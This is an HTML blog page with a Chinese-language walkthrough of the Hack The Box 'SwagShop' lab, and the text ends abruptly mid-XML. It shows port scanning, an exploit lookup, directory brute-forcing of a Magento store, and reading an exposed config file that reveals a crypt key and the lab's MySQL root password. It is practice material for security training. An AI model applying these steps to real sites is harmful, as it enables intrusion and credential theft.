@@ -1,0 +1,758 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hack The Box - SwagShop  目标IP为10.10.10.140： 1nmap -p- -Pn -sV -sC -T4 10.10.10.140  12345678910111213141516Nmap scan report for 10.10.10.140Host is up (0.16s latency).Not shown: 65533 closed tcp ports">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-SwagShop">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-SwagShop-MagentoeCommerce-RemoteCodeExecution/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Hack The Box - SwagShop  目标IP为10.10.10.140： 1nmap -p- -Pn -sV -sC -T4 10.10.10.140  12345678910111213141516Nmap scan report for 10.10.10.140Host is up (0.16s latency).Not shown: 65533 closed tcp ports">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408160715112.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408160942903.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408165303361.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408171229322.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408171324831.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408174413490.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408203043733.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408202624449.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:37.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220408160715112.png">
+  
+  
+  
+  <title>HackTheBox-SwagShop - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-SwagShop"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          63 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-SwagShop</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Hack The Box - SwagShop </p>
+<p>目标IP为10.10.10.140：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">nmap -p- -Pn -sV -<span class="hljs-keyword">sC </span>-<span class="hljs-built_in">T4</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">140</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.140</span><br><span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.16</span>s latency).<br><span class="hljs-title class_">Not</span> <span class="hljs-symbol">shown:</span> <span class="hljs-number">65533</span> closed tcp ports (reset)<br><span class="hljs-title class_">PORT</span>   <span class="hljs-title class_">STATE</span> <span class="hljs-title class_">SERVICE</span> <span class="hljs-title class_">VERSION</span><br><span class="hljs-number">22</span>/tcp open  ssh     <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">7.2</span>p2 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">8</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span> <br>|   <span class="hljs-number">2048</span> <span class="hljs-symbol">b6:</span><span class="hljs-number">55</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">d2:</span><span class="hljs-number">4</span><span class="hljs-symbol">e:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">a3:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">a:</span><span class="hljs-number">12</span><span class="hljs-symbol">:f6</span><span class="hljs-symbol">:</span><span class="hljs-number">24</span><span class="hljs-symbol">:ec</span> (<span class="hljs-title class_">RSA</span>)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-symbol">e:</span><span class="hljs-number">30</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">a:</span><span class="hljs-number">92</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-number">30</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:c1</span><span class="hljs-symbol">:</span><span class="hljs-number">77</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:ad</span><span class="hljs-symbol">:</span><span class="hljs-number">51</span><span class="hljs-symbol">:c0</span><span class="hljs-symbol">:ba</span> (<span class="hljs-title class_">ECDSA</span>)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">4</span><span class="hljs-symbol">c:</span><span class="hljs-number">50</span><span class="hljs-symbol">:d5</span><span class="hljs-symbol">:f2</span><span class="hljs-symbol">:</span><span class="hljs-number">70</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:fd</span><span class="hljs-symbol">:c4</span><span class="hljs-symbol">:b2</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span><span class="hljs-symbol">:</span><span class="hljs-number">32</span><span class="hljs-symbol">:</span><span class="hljs-number">64</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span> (<span class="hljs-title class_">ED25519</span>)<br><span class="hljs-number">80</span>/tcp open  http    <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((<span class="hljs-title class_">Ubuntu</span>))<br>|_http-<span class="hljs-symbol">title:</span> <span class="hljs-title class_">Did</span> <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//swagshop.htb/<br>|_http-server-<span class="hljs-symbol">header:</span> <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-title class_">Service</span> <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br><br><span class="hljs-title class_">Service</span> detection performed. <span class="hljs-title class_">Please</span> report any incorrect results at <span class="hljs-symbol">https:</span>//nmap.org/submit/ .<br><span class="hljs-title class_">Nmap</span> <span class="hljs-symbol">done:</span> <span class="hljs-number">1</span> <span class="hljs-title class_">IP</span> address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">485.25</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>22端口有个用户名枚举的漏洞，但我并不想利用：</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit OpenSSH</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">OpenSSH</span> <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p2 - Username Enumeration           | linux/remote/<span class="hljs-number">40136</span>.py<br></code></pre></td></tr></table></figure>
+
+<p>访问80端口获取到如下页面：</p>
+<img src="https://www.worldisend.com/img/image-20220408160715112.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408160715112" style="zoom:200%;" />
+
+<p>Wappalyzer为我很好的枚举出了目标web页面的大致信息，Magento的Web应用程序，PHP语言环境，右下角有一个建议我输入邮箱订阅的输入框，并在页脚提醒了我站点的时间，2014：</p>
+<img src="https://www.worldisend.com/img/image-20220408160942903.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408160942903" style="zoom:200%;" />
+
+<p>我试图去点击页面为我提供的按钮，发现它跳转的URL规则：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span>customer<span class="hljs-regexp">/account/</span>login/<br>http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span><span class="hljs-number">5</span>-x-hack-the-box-square-sticker.html?SID=rbc125sp335vg3tsv1qioob711<br>http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/index.php/</span><span class="hljs-number">5</span>-x-hack-the-box-square-sticker.html?SID=rbc125sp335vg3tsv1qioob711<br></code></pre></td></tr></table></figure>
+
+<p>无论点哪里的按钮，其路径都是在index.php下，然后我发现一个登录框：</p>
+<img src="https://www.worldisend.com/img/image-20220408165303361.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408165303361" style="zoom:200%;" />
+
+<p>但它看起并不像是管理人员使用的。我尝试搜寻Magento的相关漏洞，搜到了很多。但是我并没有目标Magento程序的具体版本号。我尝试对其进行路径爆破：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">21</span>] Starting:                                            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">33</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">10</span>KB - /LICENSE.txt                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">44</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">571</span>KB - /RELEASE_NOTES.txt                                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">37</span>B  - /api.php                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/app  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>app/                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">300</span>B  - <span class="hljs-regexp">/app/</span>.htaccess                                    <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - <span class="hljs-regexp">/app/</span>etc/config.xml                               <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml                                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">9</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml.additional<br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/app/</span>etc/local.xml.template                       <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">53</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">717</span>B  - /cron.sh                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">53</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /cron.php                                         <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">57</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/errors/</span>                                          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - <span class="hljs-regexp">/errors  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>errors/          <br>[<span class="hljs-number">16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /favicon.ico                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">946</span>B  - <span class="hljs-regexp">/includes/</span>                                        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">315</span>B  - <span class="hljs-regexp">/includes  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/i</span>ncludes/      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">16</span>KB - /index.php                                        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">44</span>B  - /install.php                                      <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">309</span>B  - <span class="hljs-regexp">/js  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>js/                  <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">318</span>B  - <span class="hljs-regexp">/js/</span>tiny_mce  -&gt;  http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/js/</span>tiny_mce/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">4</span>KB - <span class="hljs-regexp">/js/</span>tiny_mce/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">03</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">3</span>KB - <span class="hljs-regexp">/lib/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">03</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/lib  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>lib/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">06</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/media/</span>                                           <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">06</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/media  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/m</span>edia/            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">10</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">886</span>B  - /php.ini.sample                                   <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">12</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">314</span>B  - <span class="hljs-regexp">/pkginfo  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>pkginfo/        <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">300</span>B  - /server-status                                    <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">301</span>B  - <span class="hljs-regexp">/server-status/</span>                                   <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">312</span>B  - <span class="hljs-regexp">/shell  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>shell/            <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/shell/</span>                                           <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">16</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">311</span>B  - <span class="hljs-regexp">/skin  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>skin/              <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">310</span>B  - <span class="hljs-regexp">/var  -&gt;  http:/</span><span class="hljs-regexp">/swagshop.htb/</span>var/                <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/var/</span>                                             <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">755</span>B  - <span class="hljs-regexp">/var/</span>backups/<br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">4</span>KB - <span class="hljs-regexp">/var/</span>cache/                                       <br>[<span class="hljs-number">16</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">9</span>KB - <span class="hljs-regexp">/var/</span>package/                                           <br></code></pre></td></tr></table></figure>
+
+<p>我找到了它的配置文件，其中有条像是具体版本号的东西:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/app/</span>code<span class="hljs-regexp">/community/</span>Phoenix<span class="hljs-regexp">/Moneybookers/</span>etc/config.xml<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>&lt;/version&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我又发现了一个xml文件，它的时间有些不同，还有一个奇怪的key：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>swagshop.htb<span class="hljs-regexp">/app/</span>etc/local.xml<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">config</span>&gt;<br><span class="hljs-section">&lt;global&gt;</span><br><span class="hljs-section">&lt;install&gt;</span><br><span class="hljs-section">&lt;date&gt;</span><span class="hljs-attribute">Wed</span>, <span class="hljs-number">08</span> May <span class="hljs-number">2019</span> <span class="hljs-number">07</span>:<span class="hljs-number">23</span>:<span class="hljs-number">09</span> +<span class="hljs-number">0000</span>&lt;/date&gt;<br><span class="hljs-section">&lt;/install&gt;</span><br><span class="hljs-section">&lt;crypt&gt;</span><br><span class="hljs-section">&lt;key&gt;</span><span class="hljs-attribute">b355a9e0cd018d3f7f03607141518419</span>&lt;/key&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我好像还看到了mysql数据库root用户的密码，但是目标并没有开放数据库端口让我远程链接：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">connection</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span>localhost<span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>fMVWh7bDHpgZkyfqQXreTjU9<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dbname</span>&gt;</span>swagshop<span class="hljs-tag">&lt;/<span class="hljs-name">dbname</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">initStatements</span>&gt;</span>SET NAMES utf8<span class="hljs-tag">&lt;/<span class="hljs-name">initStatements</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">model</span>&gt;</span>mysql4<span class="hljs-tag">&lt;/<span 